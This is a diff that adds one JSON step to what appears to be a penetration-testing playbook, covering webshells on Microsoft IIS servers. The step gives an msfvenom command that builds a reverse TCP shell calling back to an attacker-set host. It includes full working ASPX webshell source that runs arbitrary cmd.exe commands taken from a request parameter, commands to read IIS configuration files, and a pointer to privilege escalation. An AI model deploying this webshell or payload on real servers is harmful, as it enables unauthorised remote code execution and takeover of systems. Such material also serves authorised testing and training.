@@ -1,0 +1,22 @@
+{
+  "id": "iis_aspx",
+  "phase": "WEB",
+  "title": "IIS / ASPX Webshell",
+  "body": "IIS runs ASPX not PHP. If you can upload or write to the webroot, drop an ASPX shell. Default IIS path is C:\\inetpub\\wwwroot.",
+  "cmd": "# Generate ASPX shell\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$lhost LPORT=$lport -f aspx -o shell.aspx\n\n# Simple ASPX webshell (upload and browse to it)\n<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<% Response.Write(Process.Start(new ProcessStartInfo(\"cmd.exe\",\n   \"/c \" + Request[\"cmd\"]) { RedirectStandardOutput=true,\n   UseShellExecute=false }).StandardOutput.ReadToEnd()); %>\n\n# Access: http://$ip/shell.aspx?cmd=whoami\n\n# IIS specific paths\nC:\\inetpub\\wwwroot\\\nC:\\inetpub\\wwwroot\\aspnet_client\\\n\n# Check IIS version and config\ntype C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\ntype C:\\inetpub\\wwwroot\\web.config",
+  "warn": "IIS app pool runs as IIS_IUSRS by default — low priv. Check SeImpersonatePrivilege for potato escalation.",
+  "choices": [
+    {
+      "label": "Webshell uploaded — got RCE",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Got shell — check token privs",
+      "next": "token_privs"
+    },
+    {
+      "label": "Upload blocked",
+      "next": "web_fuzz_deep"
+    }
+  ]
+}
